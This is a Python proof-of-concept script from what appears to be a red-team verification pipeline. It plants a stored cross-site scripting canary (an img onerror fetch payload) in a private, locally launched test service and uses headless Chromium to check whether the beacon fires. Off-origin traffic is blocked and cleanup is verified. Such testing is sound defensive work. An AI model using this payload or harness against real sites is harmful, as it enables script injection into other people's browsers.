#!/usr/bin/env python3
"""Standalone, private-destination Stage 5 stored-content canary PoC."""

import argparse
import hashlib
import json
import os
from pathlib import Path, PurePosixPath
import shutil
import socket
import subprocess
import sys
import tempfile
import time
from urllib.parse import urlparse


DESTINATION = "unix://poc-private/target.sock"
SYNTHETIC_IDENTITY = "ordinary-user:credential-free"
PAYLOAD = '<img src=x onerror="fetch(\'/signal?case=stored\')">'
ORIGIN = "https://poc.invalid"


def digest(value):
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def fail(message):
    raise RuntimeError(message)


def relative_file(root, value, name):
    path = PurePosixPath(value)
    if path.is_absolute() or not path.parts or any(part in ("", ".", "..") for part in path.parts):
        fail(f"{name} must be one normalized relative path")
    candidate = root
    for part in path.parts:
        candidate = candidate / part
        if candidate.is_symlink():
            fail(f"{name} contains a symbolic link")
    resolved = candidate.resolve(strict=True)
    if resolved.parent == resolved or root not in resolved.parents or not resolved.is_file():
        fail(f"{name} is not a regular file beneath the exact target root")
    return resolved


def target_identity(application_path, application_digest, service_path, service_digest):
    material = "\0".join(
        [
            "peritus.red-team.poc.target.v1",
            application_path,
            application_digest,
            service_path,
            service_digest,
        ]
    )
    return digest(material)


def exchange(socket_path, method, target, body=b"", headers=None):
    headers = dict(headers or {})
    headers["host"] = "poc.invalid"
    headers["connection"] = "close"
    headers["content-length"] = str(len(body))
    wire = f"{method} {target} HTTP/1.1\r\n".encode() + b"".join(
        f"{name}: {value}\r\n".encode() for name, value in headers.items()
    ) + b"\r\n" + body
    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as stream:
        stream.settimeout(5)
        stream.connect(str(socket_path))
        stream.sendall(wire)
        received = bytearray()
        while True:
            chunk = stream.recv(65536)
            if not chunk:
                break
            received.extend(chunk)
            if len(received) > 2 * 1024 * 1024:
                fail("PoC target response exceeded 2 MiB")
    head, response_body = bytes(received).split(b"\r\n\r\n", 1)
    lines = head.decode("iso-8859-1").split("\r\n")
    status = int(lines[0].split()[1])
    response_headers = {}
    for line in lines[1:]:
        name, value = line.split(":", 1)
        response_headers[name.strip()] = value.strip()
    try:
        declared_length = int(
            next(
                value
                for name, value in response_headers.items()
                if name.lower() == "content-length"
            )
        )
    except (StopIteration, ValueError):
        fail("PoC target response has no valid content length")
    if declared_length < 0 or len(response_body) < declared_length:
        fail("PoC target response body is shorter than its content length")
    response_body = response_body[:declared_length]
    return status, response_headers, response_body


def wait_ready(child, socket_path):
    deadline = time.monotonic() + 8
    while time.monotonic() < deadline:
        if child.poll() is not None:
            detail = child.stderr.read(8192).decode(errors="replace")
            fail(f"copied PoC target exited before readiness: {detail.strip()}")
        try:
            status, _, _ = exchange(socket_path, "GET", "/health")
            if status == 200:
                return
        except (OSError, ValueError):
            pass
        time.sleep(0.02)
    fail("copied PoC target did not become ready")


def browse(browser_executable, socket_path, maximum_actions, maximum_requests):
    traffic = []
    actions = 0
    blocked = 0

    def act():
        nonlocal actions
        actions += 1
        if actions > maximum_actions:
            fail("PoC browser action budget exhausted")

    def route_request(route):
        nonlocal blocked
        parsed = urlparse(route.request.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if origin == ORIGIN and len(traffic) < maximum_requests:
            body = route.request.post_data_buffer or b""
            target = parsed.path or "/"
            if parsed.query:
                target += "?" + parsed.query
            traffic.append({"event": "request", "method": route.request.method, "path": parsed.path or "/"})
            status, headers, response_body = exchange(
                socket_path, route.request.method, target, body, route.request.headers
            )
            route.fulfill(status=status, headers=headers, body=response_body)
        else:
            blocked += 1
            route.abort()

    def response_seen(response):
        parsed = urlparse(response.url)
        if f"{parsed.scheme}://{parsed.netloc}" == ORIGIN and len(traffic) < maximum_requests:
            traffic.append({"event": "response", "status": response.status, "path": parsed.path or "/"})

    from playwright.sync_api import sync_playwright

    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(
            headless=True,
            chromium_sandbox=False,
            executable_path=str(browser_executable),
            args=["--disable-background-networking", "--disable-gpu"],
        )
        browser_identity = browser.version
        context = browser.new_context(service_workers="block")
        context.route("**/*", route_request)
        context.on("response", response_seen)
        page = context.new_page()
        page.set_default_timeout(5000)
        page.set_default_navigation_timeout(10000)
        act()
        response = page.goto(ORIGIN + "/stored", wait_until="networkidle")
        act()
        comments = page.locator("#comments")
        rendered_html = comments.inner_html()
        stored_text = comments.text_content() or rendered_html
        context.close()
        browser.close()

    signal_observed = any(
        item.get("event") == "request" and item.get("path") == "/signal" for item in traffic
    )
    canonical = json.dumps(traffic, sort_keys=True, separators=(",", ":"))
    return {
        "browser_identity": browser_identity,
        "status": response.status if response else 0,
        "signal_observed": signal_observed,
        "stored_text": stored_text,
        "rendered_html_digest": digest(rendered_html),
        "traffic_digest": digest(canonical),
        "requests_observed": sum(1 for item in traffic if item.get("event") == "request"),
        "actions_executed": actions,
        "off_scope_requests_blocked": blocked,
    }


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target-root", type=Path, required=True)
    parser.add_argument("--application-path", required=True)
    parser.add_argument("--application-digest", required=True)
    parser.add_argument("--service-path", required=True)
    parser.add_argument("--service-digest", required=True)
    parser.add_argument("--target-identity", required=True)
    parser.add_argument("--destination", required=True)
    parser.add_argument("--synthetic-identity", required=True)
    parser.add_argument("--expect", choices=("vulnerable", "safe"), required=True)
    parser.add_argument("--browser-executable", type=Path, required=True)
    parser.add_argument("--maximum-actions", type=int, default=4)
    parser.add_argument("--maximum-requests", type=int, default=12)
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--result", type=Path, required=True)
    args = parser.parse_args()

    # All target-policy decisions occur before Playwright import or process launch.
    if args.destination != DESTINATION:
        fail("PoC destination must be the exact private Unix destination")
    if args.synthetic_identity != SYNTHETIC_IDENTITY:
        fail("PoC identity must be the exact synthetic credential-free subject")
    if not (3 <= args.maximum_actions <= 12 and 8 <= args.maximum_requests <= 24):
        fail("PoC bounds are outside the minimized profile")
    root = args.target_root.absolute()
    try:
        resolved_root = root.resolve(strict=True)
    except OSError:
        fail("PoC target root is unresolved")
    if root != resolved_root or not root.is_dir():
        fail("PoC target root must be an exact non-symlink directory")
    application = relative_file(root, args.application_path, "application path")
    service = relative_file(root, args.service_path, "service path")
    application_before = application.read_bytes()
    service_before = service.read_bytes()
    if digest(application_before) != args.application_digest:
        fail("PoC application preimage digest differs from the manifest")
    if digest(service_before) != args.service_digest:
        fail("PoC service preimage digest differs from the manifest")
    expected_target = target_identity(
        args.application_path,
        args.application_digest,
        args.service_path,
        args.service_digest,
    )
    if args.target_identity != expected_target:
        fail("PoC target identity differs from the exact manifest target")
    if not args.browser_executable.is_absolute() or not args.browser_executable.is_file():
        fail("PoC browser executable is unresolved")

    args.output.mkdir(parents=True, exist_ok=True)
    os.chmod(args.output, 0o700)
    child = None
    temporary_path = None
    browser = None
    try:
        # AF_UNIX paths are commonly limited to roughly 108 bytes. The host worker and retained
        # artifact roots may already be deeply nested, so place only this disposable runtime in
        # the platform temporary root and prove its removal below.
        with tempfile.TemporaryDirectory(prefix="peritus-poc-") as temporary:
            temporary_path = Path(temporary)
            os.chmod(temporary_path, 0o700)
            copied_application = temporary_path / "application.py"
            copied_service = temporary_path / "service.py"
            shutil.copyfile(application, copied_application)
            shutil.copyfile(service, copied_service)
            socket_path = temporary_path / "target.sock"
            state_path = temporary_path / "state.json"
            secret_path = temporary_path / "secret"
            state_path.write_text("{}\n", encoding="utf-8")
            secret_path.write_text("peritus-stage5-synthetic-canary\n", encoding="utf-8")
            child = subprocess.Popen(
                [sys.executable, str(copied_service), str(socket_path), str(state_path), str(secret_path)],
                cwd=temporary_path,
                env={},
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
            )
            wait_ready(child, socket_path)
            body = json.dumps({"comment": PAYLOAD}, separators=(",", ":")).encode()
            status, _, _ = exchange(
                socket_path,
                "POST",
                "/store-comment",
                body,
                {"content-type": "application/json"},
            )
            if status != 200:
                fail("minimized PoC store step did not return HTTP 200")
            browser = browse(
                args.browser_executable,
                socket_path,
                args.maximum_actions,
                args.maximum_requests,
            )
            expected_signal = args.expect == "vulnerable"
            if browser["status"] != 200 or browser["signal_observed"] != expected_signal:
                fail("minimized PoC canary result differed from the declared twin expectation")
            if "onerror" not in browser["stored_text"] or "/signal?case=stored" not in browser["stored_text"]:
                fail("minimized PoC did not preserve the fixed harmless canary input")
            child.terminate()
            child.wait(timeout=5)
            child = None
        cleanup_complete = temporary_path is not None and not temporary_path.exists()
    finally:
        if child is not None:
            child.kill()
            child.wait(timeout=5)

    source_unchanged = (
        application.read_bytes() == application_before and service.read_bytes() == service_before
    )
    if not cleanup_complete or not source_unchanged:
        fail("PoC cleanup or original-source preservation proof failed")
    target = {
        "application_path": args.application_path,
        "application_digest": args.application_digest,
        "service_path": args.service_path,
        "service_digest": args.service_digest,
        "target_identity": args.target_identity,
    }
    result = {
        "schema": 2,
        "target": target,
        "expected_signal": args.expect == "vulnerable",
        "observed_signal": browser["signal_observed"],
        "browser_identity": browser["browser_identity"],
        "traffic_digest": browser["traffic_digest"],
        "requests_observed": browser["requests_observed"],
        "actions_executed": browser["actions_executed"],
        "off_scope_requests_blocked": browser["off_scope_requests_blocked"],
        "cleanup_complete": cleanup_complete,
        "original_source_unchanged": source_unchanged,
    }
    result["result_digest"] = digest(json.dumps(result, sort_keys=True, separators=(",", ":")))
    args.result.write_text(json.dumps(result, sort_keys=True, separators=(",", ":")) + "\n")


if __name__ == "__main__":
    main()
